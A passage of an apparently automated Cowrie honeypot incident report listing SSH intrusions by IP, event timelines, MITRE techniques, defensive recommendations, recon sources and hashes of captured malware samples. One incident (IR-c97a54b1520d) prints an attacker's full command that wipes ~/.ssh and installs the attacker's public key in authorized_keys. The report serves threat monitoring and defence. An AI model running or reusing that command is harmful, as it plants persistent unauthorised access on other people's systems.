| `2026-07-09 14:40:22` | `cowrie.client.version` |
| `2026-07-09 14:40:22` | `cowrie.client.kex` |
| `2026-07-09 14:40:24` | `cowrie.login.success` |
| `2026-07-09 14:40:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799f5f2e54cc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:40 |
| **Last Seen** | 2026-07-09 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:40:38` | `cowrie.session.connect` |
| `2026-07-09 14:40:38` | `cowrie.client.version` |
| `2026-07-09 14:40:38` | `cowrie.client.kex` |
| `2026-07-09 14:40:39` | `cowrie.login.success` |
| `2026-07-09 14:40:39` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:40:39` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3309a3b45111

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 14:41 |
| **Last Seen** | 2026-07-09 14:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:41:49` | `cowrie.session.connect` |
| `2026-07-09 14:41:50` | `cowrie.client.version` |
| `2026-07-09 14:41:50` | `cowrie.client.kex` |
| `2026-07-09 14:41:56` | `cowrie.login.success` |
| `2026-07-09 14:41:59` | `cowrie.session.params` |
| `2026-07-09 14:41:59` | `cowrie.command.input` |
| `2026-07-09 14:42:01` | `cowrie.log.closed` |
| `2026-07-09 14:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21366e9633be

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]41` |
| **First Seen** | 2026-07-09 14:46 |
| **Last Seen** | 2026-07-09 14:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:46:56` | `cowrie.session.connect` |
| `2026-07-09 14:46:56` | `cowrie.client.version` |
| `2026-07-09 14:46:56` | `cowrie.client.kex` |
| `2026-07-09 14:46:58` | `cowrie.login.success` |
| `2026-07-09 14:46:59` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]41` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-134867d55292

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-09 14:47 |
| **Last Seen** | 2026-07-09 14:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:47:04` | `cowrie.session.connect` |
| `2026-07-09 14:47:05` | `cowrie.client.version` |
| `2026-07-09 14:47:05` | `cowrie.client.kex` |
| `2026-07-09 14:47:06` | `cowrie.login.success` |
| `2026-07-09 14:47:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcade5923fe7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 14:50 |
| **Last Seen** | 2026-07-09 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:50:22` | `cowrie.session.connect` |
| `2026-07-09 14:50:22` | `cowrie.client.version` |
| `2026-07-09 14:50:22` | `cowrie.client.kex` |
| `2026-07-09 14:50:23` | `cowrie.login.success` |
| `2026-07-09 14:50:23` | `cowrie.session.params` |
| `2026-07-09 14:50:23` | `cowrie.command.input` |
| `2026-07-09 14:50:23` | `cowrie.log.closed` |
| `2026-07-09 14:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c97a54b1520d

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-09 14:52 |
| **Last Seen** | 2026-07-09 14:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:52:43` | `cowrie.session.connect` |
| `2026-07-09 14:52:43` | `cowrie.client.version` |
| `2026-07-09 14:52:43` | `cowrie.client.kex` |
| `2026-07-09 14:52:44` | `cowrie.login.success` |
| `2026-07-09 14:52:45` | `cowrie.session.params` |
| `2026-07-09 14:52:45` | `cowrie.command.input` |
| `2026-07-09 14:52:45` | `cowrie.command.failed` |
| `2026-07-09 14:52:45` | `cowrie.log.closed` |
| `2026-07-09 14:52:46` | `cowrie.session.params` |
| `2026-07-09 14:52:46` | `cowrie.command.input` |
| `2026-07-09 14:52:46` | `cowrie.session.file_download` |
| `2026-07-09 14:52:46` | `cowrie.log.closed` |
| `2026-07-09 14:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f757634242

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-09 14:52 |
| **Last Seen** | 2026-07-09 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:52:46` | `cowrie.session.connect` |
| `2026-07-09 14:52:46` | `cowrie.client.version` |
| `2026-07-09 14:52:46` | `cowrie.client.kex` |
| `2026-07-09 14:52:47` | `cowrie.login.success` |
| `2026-07-09 14:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd588833b07

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-09 14:52 |
| **Last Seen** | 2026-07-09 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:52:47` | `cowrie.session.connect` |
| `2026-07-09 14:52:47` | `cowrie.client.version` |
| `2026-07-09 14:52:47` | `cowrie.client.kex` |
| `2026-07-09 14:52:48` | `cowrie.login.success` |
| `2026-07-09 14:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019e3d3f9adb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 14:53 |
| **Last Seen** | 2026-07-09 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:53:20` | `cowrie.session.connect` |
| `2026-07-09 14:53:22` | `cowrie.client.version` |
| `2026-07-09 14:53:22` | `cowrie.client.kex` |
| `2026-07-09 14:53:27` | `cowrie.login.success` |
| `2026-07-09 14:53:31` | `cowrie.session.params` |
| `2026-07-09 14:53:31` | `cowrie.command.input` |
| `2026-07-09 14:53:33` | `cowrie.log.closed` |
| `2026-07-09 14:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c064aa52f12

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:53 |
| **Last Seen** | 2026-07-09 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:53:45` | `cowrie.session.connect` |
| `2026-07-09 14:53:45` | `cowrie.client.version` |
| `2026-07-09 14:53:45` | `cowrie.client.kex` |
| `2026-07-09 14:53:46` | `cowrie.login.success` |
| `2026-07-09 14:53:46` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:53:46` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **84** | 2026-07-09 10:56 | 2026-07-09 14:51 | 89m | 0 | `T1592` | 🟠 MEDIUM |
| `72.47.208[.]90` | **19** | 2026-07-09 14:17 | 2026-07-09 14:43 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-09 11:02 | 2026-07-09 14:52 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `64.89.162[.]15` | **6** | 2026-07-09 13:39 | 2026-07-09 14:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **5** | 2026-07-09 12:29 | 2026-07-09 14:43 | 3m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **5** | 2026-07-09 12:50 | 2026-07-09 12:55 | 8m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-07-09 11:48 | 2026-07-09 14:48 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `41.231.36[.]137` | **4** | 2026-07-09 12:49 | 2026-07-09 12:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.124[.]220` | **3** | 2026-07-09 12:09 | 2026-07-09 12:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]107` | **3** | 2026-07-09 13:53 | 2026-07-09 13:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | **3** | 2026-07-09 13:56 | 2026-07-09 13:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]194` | **3** | 2026-07-09 13:57 | 2026-07-09 13:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]123` | **3** | 2026-07-09 13:53 | 2026-07-09 13:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | **3** | 2026-07-09 13:52 | 2026-07-09 13:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]90` | **3** | 2026-07-09 13:56 | 2026-07-09 13:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **3** | 2026-07-09 12:12 | 2026-07-09 12:49 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-07-09 11:03 | 2026-07-09 11:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]198` | **2** | 2026-07-09 13:08 | 2026-07-09 13:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | **2** | 2026-07-09 12:33 | 2026-07-09 13:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-09 13:10 | 2026-07-09 13:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.167.33[.]157` | **2** | 2026-07-09 12:24 | 2026-07-09 12:26 | 4m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-07-09 13:46 | 2026-07-09 13:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-07-09 11:24 | 2026-07-09 12:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `104.198.139[.]202` | 1 | 2026-07-09 14:11 | 2026-07-09 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.18[.]199` | 1 | 2026-07-09 11:06 | 2026-07-09 11:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.159.167[.]177` | 1 | 2026-07-09 13:29 | 2026-07-09 13:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.27.129[.]78` | 1 | 2026-07-09 12:54 | 2026-07-09 12:55 | 12s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-07-09 14:45 | 2026-07-09 14:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]149` | 1 | 2026-07-09 14:40 | 2026-07-09 14:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | 1 | 2026-07-09 14:12 | 2026-07-09 14:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.59.105[.]108` | 1 | 2026-07-09 12:49 | 2026-07-09 12:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-09 12:50 | 2026-07-09 12:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-07-09 14:06 | 2026-07-09 14:07 | 40s | 0 | `T1592` | 🟢 LOW |
| `164.92.228[.]62` | 1 | 2026-07-09 12:07 | 2026-07-09 12:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]217` | 1 | 2026-07-09 11:24 | 2026-07-09 11:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-07-09 11:04 | 2026-07-09 11:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-07-09 13:34 | 2026-07-09 13:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-07-09 13:56 | 2026-07-09 13:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-09 11:30 | 2026-07-09 11:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-09 11:02 | 2026-07-09 11:02 | 40s | 0 | `T1592` | 🟢 LOW |
| `209.99.185[.]239` | 1 | 2026-07-09 12:28 | 2026-07-09 12:29 | 64s | 0 | `T1592` | 🟢 LOW |
| `210.97.60[.]164` | 1 | 2026-07-09 11:32 | 2026-07-09 11:32 | 13s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-07-09 12:41 | 2026-07-09 12:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.120.42[.]196` | 1 | 2026-07-09 12:30 | 2026-07-09 12:31 | 6s | 0 | `T1592` | 🟢 LOW |
| `221.182.185[.]190` | 1 | 2026-07-09 11:39 | 2026-07-09 11:41 | 86s | 0 | `T1592` | 🟢 LOW |
| `221.182.185[.]190` | 1 | 2026-07-09 13:59 | 2026-07-09 13:59 | 16s | 0 | `T1592` | 🟢 LOW |
| `223.107.72[.]234` | 1 | 2026-07-09 14:36 | 2026-07-09 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-09 13:03 | 2026-07-09 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-09 12:54 | 2026-07-09 12:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-09 14:34 | 2026-07-09 14:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-09 14:34 | 2026-07-09 14:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]49` | 1 | 2026-07-09 13:59 | 2026-07-09 13:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]64` | 1 | 2026-07-09 12:03 | 2026-07-09 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]50` | 1 | 2026-07-09 13:58 | 2026-07-09 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-09 12:22 | 2026-07-09 12:23 | 55s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-07-09 13:42 | 2026-07-09 13:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]104` | 1 | 2026-07-09 13:46 | 2026-07-09 13:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `67.201.38[.]131` | 1 | 2026-07-09 11:10 | 2026-07-09 11:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-09 10:55 | 2026-07-09 10:56 | 41s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-09 13:26 | 2026-07-09 13:27 | 44s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-07-09 13:34 | 2026-07-09 13:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `85.159.165[.]216` | 1 | 2026-07-09 14:38 | 2026-07-09 14:38 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
